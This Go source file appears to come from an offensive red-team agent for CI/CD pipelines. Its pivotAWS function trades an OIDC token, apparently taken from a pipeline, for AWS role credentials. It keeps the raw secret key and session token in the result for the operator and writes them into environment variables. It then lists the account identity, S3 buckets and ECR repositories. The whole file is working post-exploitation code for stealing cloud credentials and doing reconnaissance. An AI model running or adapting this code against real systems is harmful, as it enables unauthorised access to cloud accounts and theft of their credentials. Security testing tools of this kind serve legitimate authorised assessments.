// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package brisket

import (
	"context"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/ecr"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/aws/aws-sdk-go-v2/service/sts"

	"github.com/boostsecurityio/smokedmeat/internal/models"
)

func (a *Agent) pivotAWS(token *OIDCToken, result *models.PivotResult, args []string) error {
	roleARN := getArgOrEnv(args, "role-arn", "AWS_ROLE_ARN", "AWS_ROLE_TO_ASSUME")
	if roleARN == "" {
		result.Errors = append(result.Errors, "AWS_ROLE_ARN not set. Configure it or use OIDC trust with repository-based role naming.")
		return fmt.Errorf("AWS_ROLE_ARN required for OIDC assume-role")
	}

	region := getArgOrEnv(args, "region", "AWS_DEFAULT_REGION", "AWS_REGION")
	if region == "" {
		region = "us-east-1"
	}

	ctx := context.Background()

	stsClient := sts.New(sts.Options{
		Region:      region,
		Credentials: aws.AnonymousCredentials{},
		HTTPClient:  a.client,
	})

	input := &sts.AssumeRoleWithWebIdentityInput{
		RoleArn:          aws.String(roleARN),
		RoleSessionName:  aws.String("smokedmeat-" + a.agentID),
		WebIdentityToken: aws.String(token.RawToken),
		DurationSeconds:  aws.Int32(3600),
	}

	if dur := getArgOrEnv(args, "role-duration-seconds"); dur != "" {
		var d int32
		if _, err := fmt.Sscanf(dur, "%d", &d); err == nil && d > 0 {
			input.DurationSeconds = aws.Int32(d)
		}
	}

	resp, err := stsClient.AssumeRoleWithWebIdentity(ctx, input)
	if err != nil {
		return fmt.Errorf("sts AssumeRoleWithWebIdentity failed: %w", err)
	}

	accessKeyID := aws.ToString(resp.Credentials.AccessKeyId)
	secretKey := aws.ToString(resp.Credentials.SecretAccessKey)
	sessionToken := aws.ToString(resp.Credentials.SessionToken)
	expiration := ""
	if resp.Credentials.Expiration != nil {
		expiration = resp.Credentials.Expiration.Format(time.RFC3339)
	}
	assumedRole := aws.ToString(resp.AssumedRoleUser.Arn)

	result.Credentials = map[string]string{
		"AWS_ACCESS_KEY_ID":     accessKeyID,
		"AWS_SECRET_ACCESS_KEY": redactToken(secretKey),
		"AWS_SESSION_TOKEN":     redactToken(sessionToken),
		"AssumedRole":           assumedRole,
		"Expiration":            expiration,
	}

	result.RawCredentials = map[string]string{
		"AWS_ACCESS_KEY_ID":     accessKeyID,
		"AWS_SECRET_ACCESS_KEY": secretKey,
		"AWS_SESSION_TOKEN":     sessionToken,
		"Expiration":            expiration,
		"AWS_DEFAULT_REGION":    region,
	}

	os.Setenv("AWS_ACCESS_KEY_ID", accessKeyID)
	os.Setenv("AWS_SECRET_ACCESS_KEY", secretKey)
	os.Setenv("AWS_SESSION_TOKEN", sessionToken)

	staticCreds := credentials.NewStaticCredentialsProvider(accessKeyID, secretKey, sessionToken)
	a.enumerateAWS(ctx, result, region, staticCreds)

	return nil
}

func (a *Agent) enumerateAWS(ctx context.Context, result *models.PivotResult, region string, creds credentials.StaticCredentialsProvider) {
	var wg sync.WaitGroup
	var mu sync.Mutex

	wg.Add(3)
	go func() {
		defer wg.Done()
		stsClient := sts.New(sts.Options{Region: region, Credentials: creds, HTTPClient: a.client})
		identity, err := stsClient.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})
		if err == nil {
			mu.Lock()
			result.Resources = append(result.Resources, models.CloudResource{
				Type: "identity",
				ID:   aws.ToString(identity.Arn),
				Name: aws.ToString(identity.UserId),
				Metadata: map[string]string{
					"Account": aws.ToString(identity.Account),
				},
			})
			mu.Unlock()
		}
	}()

	go func() {
		defer wg.Done()
		s3Client := s3.New(s3.Options{Region: region, Credentials: creds, HTTPClient: a.client})
		buckets, err := s3Client.ListBuckets(ctx, &s3.ListBucketsInput{})
		if err == nil {
			mu.Lock()
			for _, b := range buckets.Buckets {
				result.Resources = append(result.Resources, models.CloudResource{
					Type: "s3_bucket",
					Name: aws.ToString(b.Name),
				})
			}
			mu.Unlock()
		}
	}()

	go func() {
		defer wg.Done()
		ecrClient := ecr.New(ecr.Options{Region: region, Credentials: creds, HTTPClient: a.client})
		repos, err := ecrClient.DescribeRepositories(ctx, &ecr.DescribeRepositoriesInput{})
		if err == nil {
			mu.Lock()
			for _, r := range repos.Repositories {
				result.Resources = append(result.Resources, models.CloudResource{
					Type: "ecr_repository",
					ID:   aws.ToString(r.RepositoryArn),
					Name: aws.ToString(r.RepositoryName),
				})
			}
			mu.Unlock()
		}
	}()

	wg.Wait()
}
